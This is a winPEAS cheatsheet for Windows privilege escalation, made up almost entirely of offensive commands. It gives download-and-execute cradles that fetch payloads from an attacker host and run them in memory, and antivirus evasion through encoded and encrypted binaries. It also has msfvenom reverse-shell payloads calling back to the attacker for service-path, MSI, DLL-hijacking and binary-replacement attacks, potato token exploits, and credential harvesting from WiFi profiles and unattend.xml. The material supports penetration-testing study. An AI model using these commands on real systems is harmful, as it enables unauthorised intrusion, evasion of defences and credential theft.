# winPEAS Cheatsheet

## Quick Reference

| Command | Purpose |
|---------|---------|
| `winPEASx64.exe` | Full scan — all checks |
| `winPEASx64.exe fast` | Fast mode — skip slow checks |
| `winPEASx64.exe quietcmd` | Clean output — minimal noise |
| `winPEAS.ps1` | PowerShell version |
| `winPEAS.bat` | Batch version (last resort) |

---

## Installation

```bash
# Kali package
sudo apt install peass-ng
ls /usr/share/peass-ng/winPEAS/

# Download directly
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
```

## Transfer to Windows

```bash
# Python HTTP server on Kali
sudo python3 -m http.server 8000

# SMB share
impacket-smbserver share . -smb2support
```

```powershell
# PowerShell download
Invoke-WebRequest http://10.10.14.20:8000/winPEASx64.exe -OutFile C:\Temp\winPEAS.exe

# certutil download (older systems)
certutil -urlcache -split -f http://10.10.14.20:8000/winPEASx64.exe C:\Temp\winPEAS.exe

# SMB copy
copy \\10.10.14.20\share\winPEASx64.exe C:\Temp\

# Bitsadmin download
bitsadmin /transfer job /download /priority high http://10.10.14.20:8000/winPEASx64.exe C:\Temp\winPEAS.exe
```

## Basic Usage

```cmd
:: C# executable (recommended)
winPEASx64.exe

:: Fast mode
winPEASx64.exe fast

:: Quiet command mode
winPEASx64.exe quietcmd

:: Output to file
winPEASx64.exe > C:\Temp\winpeas.txt 2>&1

:: PowerShell version
powershell -ExecutionPolicy Bypass -File winPEAS.ps1

:: Batch version
winPEAS.bat
```

## Memory Execution (AV Bypass)

```powershell
# Download and execute .NET assembly in memory
powershell -c "$x = (New-Object Net.WebClient).DownloadData('http://10.10.14.20:8000/winPEASx64.exe'); [System.Reflection.Assembly]::Load($x); [PEASS]::Main()"

# Base64 encoded — decode and execute
powershell -c "$b = (New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS64_b64.txt'); [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($b)); [PEASS]::Main()"

# PowerShell download cradle
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS.ps1')"

# Encoded PowerShell command
powershell -enc <base64_encoded_command>
```

## AV Bypass Methods

```bash
# On attacker — Base64 encode
base64 winPEASx64.exe > winPEAS64_b64.txt

# On attacker — OpenSSL encrypt
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:secret -in winPEASx64.exe -out winPEAS.enc
```

```powershell
# On victim — Base64 decode and execute
$b = (New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS64_b64.txt')
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($b)) | Out-Null
[PEASS]::Main()

# On victim — OpenSSL decrypt and execute
$key = [System.Text.Encoding]::UTF8.GetBytes("secret")
$iv = [System.Text.Encoding]::UTF8.GetBytes("0000000000000000")
$cipher = [System.Security.Cryptography.Aes]::Create()
$decryptor = $cipher.CreateDecryptor($key, $iv)
$encrypted = [System.IO.File]::ReadAllBytes("C:\Temp\winPEAS.enc")
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
[System.IO.File]::WriteAllBytes("C:\Temp\winPEAS.exe", $decrypted)
C:\Temp\winPEAS.exe
```

## Output Filtering

```cmd
:: Find all Red/Yellow findings (highest confidence)
findstr /i "WARNING\|VULNERABLE\|EXCELLENT" winpeas.txt

:: Find unquoted service paths
findstr /i "unquoted" winpeas.txt

:: Find writable directories
findstr /i "writable" winpeas.txt

:: Find stored credentials
findstr /i "password\|credential\|token" winpeas.txt

:: Find kernel exploits
findstr /i "exploit\|kernel\|CVE" winpeas.txt

:: Find AlwaysInstallElevated
findstr /i "AlwaysInstallElevated" winpeas.txt

:: Find DLL hijacking
findstr /i "DLL\|hijack" winpeas.txt

:: Find scheduled tasks
findstr /i "task\|schedule" winpeas.txt

:: Find service misconfigs
findstr /i "service\|binpath" winpeas.txt

:: Find token impersonation
findstr /i "token\|impersonate\|potato" winpeas.txt
```

## Common Findings and Exploits

### Unquoted Service Path

```cmd
:: winPEAS finds: "C:\Program Files\My Service\service.exe"
:: Service path contains spaces without quotes

:: Exploit — create malicious executable
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o service.exe
copy service.exe "C:\Program.exe"
sc start "My Service"
# or
sc start MyService
```

### AlwaysInstallElevated

```powershell
:: winPEAS finds both registry keys set to 1:
:: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
:: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

:: Exploit — create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Token Impersonation (SeImpersonatePrivilege)

```cmd
:: winPEAS identifies SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

:: PrintSpoofer (Windows Server 2016/2019/2022)
PrintSpoofer.exe -i -c cmd

:: GodPotato (Windows 8-11, Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"

:: JuicyPotato (Windows Server 2008-2016)
JuicyPotato.exe -l 1337 -p C:\Temp\shell.exe -t * -c {CLSID}

:: SweetPotato
SweetPotato.exe -p C:\Temp\shell.exe
```

### DLL Hijacking

```cmd
:: winPEAS finds writable directory in DLL search path
:: Place malicious DLL in writable directory

:: Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f dll -o hijack.dll

:: Copy to writable directory
copy hijack.dll "C:\Program Files\Vulnerable App\"

:: Restart service or wait for application to load
```

### Stored WiFi Passwords

```cmd
:: winPEAS extracts saved WiFi passwords
:: Exploit — use recovered passwords for lateral movement

:: Manual extraction
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear
```

### Unattended.xml / Sysprep Passwords

```cmd
:: winPEAS finds passwords in unattend.xml files
:: Common locations:
:: C:\Windows\Panther\Unattend.xml
:: C:\Windows\Panther\Unattend\Unattend.xml
:: C:\Windows\System32\Sysprep\Unattend.xml
:: C:\Windows\System32\Sysprep\Panther\Unattend.xml

:: Exploit — extract and use credentials
findstr /i "password" C:\Windows\Panther\Unattend.xml
```

### Kernel Exploits

```powershell
:: winPEAS identifies vulnerable kernel version
:: Common exploits:

:: BlueKeep (CVE-2019-0708) — Windows 7/Server 2008 R2
:: PrintNightmare (CVE-2021-34527) — Windows Server 2019
:: HIVENightmare (CVE-2021-36934) — Windows 10/11
:: PetitPotam (CVE-2021-36942) — Windows Server
:: InstallerFileTakeOver (CVE-2021-41379) — Windows 10

:: Verify kernel version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
```

### Writable Service Binary Path

```cmd
:: winPEAS finds service with writable binary directory
:: Exploit — replace legitimate binary with malicious one

:: Find writable service directories
:: winPEAS highlights services where the binary path directory is writable

:: Replace service binary
copy C:\Temp\shell.exe "C:\Program Files\Vulnerable Service\service.exe"
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

### Autorun Programs

```cmd
:: winPEAS finds autorun programs with writable binary paths
:: Exploit — replace autorun binary

:: Check registry autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Replace binary if writable
copy shell.exe "C:\Program Files\AutorunApp\app.exe"
```

## Practical Workflow

```
1. Get shell on 192.168.1.100 (Meterpreter, PowerShell, cmd)
2. Transfer winPEAS:
   a. python3 -m http.server 8000  (attacker)
   b. Invoke-WebRequest http://10.10.14.20:8000/winPEASx64.exe -OutFile C:\Temp\w.exe
3. Execute: C:\Temp\w.exe > C:\Temp\out.txt 2>&1
4. Filter: findstr /i "WARNING VULNERABLE EXCELLENT" C:\Temp\out.txt
5. Pick highest-confidence finding
6. Check GTFOBins/LOLBAS for exploitation technique
7. Exploit manually
8. Verify: whoami → nt authority\system
```

## Quick Exploit Reference

```cmd
:: Transfer exploit tools
Invoke-WebRequest http://10.10.14.20:8000/PrintSpoofer.exe -OutFile C:\Temp\PrintSpoofer.exe
Invoke-WebRequest http://10.10.14.20:8000/GodPotato.exe -OutFile C:\Temp\GodPotato.exe

:: Reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o shell.exe

:: Listen on attacker
nc -lvnp 4444

:: Execute payload
C:\Temp\shell.exe
```

## System Info Quick Check

```cmd
:: OS version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

:: Hotfixes
wmic qfe list brief

:: Installed software
wmic product get name,version

:: Running processes
tasklist /svc

:: Services
sc query state= all

:: Users
net user
net localgroup administrators

:: Network
ipconfig /all
route print
netstat -ano
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `not recognized` | Use correct architecture: winPEASx64.exe vs winPEASx86.exe |
| `.NET Framework not found` | Install .NET 4.5.2+ or use PowerShell/batch version |
| AV quarantines file | Use memory execution or Base64 encoded version |
| Colors not showing | Run in cmd.exe, not PowerShell ISE |
| `Access denied` | Run as current user; check file permissions |
| PowerShell restricted | Use `-ExecutionPolicy Bypass` or C# version |
| Output truncated | Redirect to file: `> C:\Temp\out.txt` |
| Script hangs | Use `fast` mode to skip slow checks |
| No output | Check if output is being suppressed; try `quietcmd` |
| 32-bit vs 64-bit | Use winPEASx86.exe on 32-bit systems |
| Encoding issues | Use `chcp 65001` for UTF-8 in cmd |
